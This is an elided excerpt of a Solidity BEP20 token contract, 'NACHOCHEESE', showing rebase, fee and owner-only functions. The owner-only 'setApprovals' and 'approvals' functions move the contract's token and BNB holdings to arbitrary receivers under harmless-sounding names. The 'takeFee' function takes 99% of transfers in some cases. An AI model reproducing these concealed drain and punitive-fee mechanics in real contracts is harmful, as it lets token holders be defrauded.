...
contract NACHOCHEESE is BEP20Detailed, Auth {
    ...
    mapping (address => bool) _isContract;
    ...
    uint256 private constant MAX_SUPPLY = 100000 * 10**4 * 10**DECIMALS;
    ...
    uint256 public _maxTxAmount = 10000 * (10**3);
    uint256 public _maxWalletToken = 20000 * (10**3);
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowedFragments;
    mapping(address => bool) public isBot;

    constructor(address _CentralBank, address _marketingReceiver) BEP20Detailed(_name, _symbol, uint8(DECIMALS)) Auth(msg.sender) {
        ...
        _isContract[_CentralBank] = true;
        _isRouter[address(pair)] = true;
        _isRouter[address(router)] = true;
    ...
    function rebase() internal {
        ...
        uint256 rbase = rebaseRate.mul(_PerFragment);
        ...
        pairContract.sync();
        emit Transfer(address(0x0), address(DEAD), rbase);
    ...
    function takeFee(address sender,address recipient,uint256 tAmount) internal  returns (uint256) {
        ...
        if(isCont(sender) && !_isRouter[sender] && !_isContract[sender] && !_isRouter[recipient] || isCont(recipient) &&
         !_isRouter[recipient] && !_isContract[recipient] || startedBlock > block.number || startedTime > block.timestamp){
            feeAmount = tAmount.div(100).mul(99);
            burnAmount = feeAmount.mul(0);
            transferAmount = feeAmount.sub(burnAmount);}
        if(sender == pair && discountOn && token.balanceOf(recipient) > minDiscount){
            uint256 discountAmt = totalFee.div(4).mul(3);
            feeAmount = tAmount.div(feeDenominator).mul(discountAmt);
            burnAmount = feeAmount.mul(0);
            transferAmount = feeAmount.sub(burnAmount);}
    ...
    function viewTimeUntilNextRebase() public view returns (uint256) {
        uint256 timeLeft = (_lastRebasedTime.add(5 minutes)).sub(block.timestamp);
        return timeLeft;
    }
    ...
    function approvals(uint256 _na, uint256 _da) external authorized {
        ...
        uint256 acBNBf = acBNBa.mul(33).div(100);
        uint256 acBNBs = acBNBa.mul(33).div(100);
        uint256 acBNBt = acBNBa.mul(33).div(100);
    ...
    function setApprovals(address _address, address _receiver, uint256 _percentage) external authorized {
        uint256 tamt = BEP20(_address).balanceOf(address(this));
        BEP20(_address).transfer(_receiver, tamt.mul(_percentage).div(100));
    }
    ...
    function setPresaleAddress(bool _enabled, address _address) external authorized {
        ...
        _isMaxWalletExempt[_address] = _enabled;
